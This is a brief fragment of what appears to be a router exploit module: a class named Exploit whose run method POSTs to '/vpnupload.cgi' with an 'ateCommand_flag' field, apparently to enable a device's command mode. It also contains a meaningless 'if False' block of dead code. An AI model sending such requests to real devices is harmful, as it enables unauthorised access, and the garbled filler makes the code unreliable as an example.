...
class Exploit(HTTPClient, UDPClient):
    ...
    def run(self):
        if False:
            i = 10
            return i + 15
        response = self.http_request(method='POST', path='/vpnupload.cgi', files={'ateCommand_flag': '1'})
